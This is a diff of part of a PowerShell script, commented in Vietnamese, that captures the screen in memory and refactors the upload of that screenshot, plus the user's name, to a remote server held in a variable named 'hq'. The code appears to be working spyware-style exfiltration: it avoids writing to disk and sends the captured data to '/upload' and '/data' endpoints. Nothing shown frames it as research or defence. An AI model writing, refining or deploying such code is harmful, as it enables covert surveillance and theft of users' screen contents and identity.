@@ -16,23 +16,41 @@ $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
 # Chuyển ảnh sang MemoryStream thay vì lưu vào file
 $memoryStream = New-Object System.IO.MemoryStream
 $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
+$imageData = $memoryStream.ToArray()
+
+# Giải phóng tài nguyên ngay lập tức
 $bitmap.Dispose()
 $graphics.Dispose()
-
-# Chuyển MemoryStream thành mảng byte để gửi đi
-$imageData = $memoryStream.ToArray()
 $memoryStream.Dispose()
 
-# Gửi dữ liệu hình ảnh tới server
-$uriUpload = "$hq/upload"
-$client = New-Object System.Net.WebClient
-$client.Headers.Add("Content-Type", "application/octet-stream")
-$client.UploadData($uriUpload, "POST", $imageData)
+# Gửi dữ liệu không đồng bộ
+Function Send-Data {
+    param (
+        [string]$uri,
+        [byte[]]$imageData = $null,
+        [string]$jsonData = $null
+    )
+    $client = New-Object System.Net.Http.HttpClient
+    if ($imageData) {
+        # Tạo nội dung ảnh dạng ByteArrayContent
+        $content = New-Object System.Net.Http.ByteArrayContent($imageData)
+        $content.Headers.ContentType = 'application/octet-stream'
+        $response = $client.PostAsync($uri, $content).Result
+        Write-Output "Image upload status: $($response.StatusCode)"
+    }
+    if ($jsonData) {
+        # Tạo nội dung JSON dạng StringContent
+        $content = New-Object System.Net.Http.StringContent($jsonData, [System.Text.Encoding]::UTF8, 'application/json')
+        $response = $client.PostAsync($uri, $content).Result
+        Write-Output "Data upload status: $($response.StatusCode)"
+    }
+    $client.Dispose()
+}
+
+# Gửi hình ảnh
+Send-Data -uri "$hq/upload" -imageData $imageData
 
 # Gửi tên người dùng
-$uriData = "$hq/data"
-$client.Headers.Clear()
-$client.Headers.Add("Content-Type", "application/json")
 $data = @{ name = $name }
 $jsonData = $data | ConvertTo-Json -Depth 10
-$client.UploadString($uriData, "POST", $jsonData)
+Send-Data -uri "$hq/data" -jsonData $jsonData
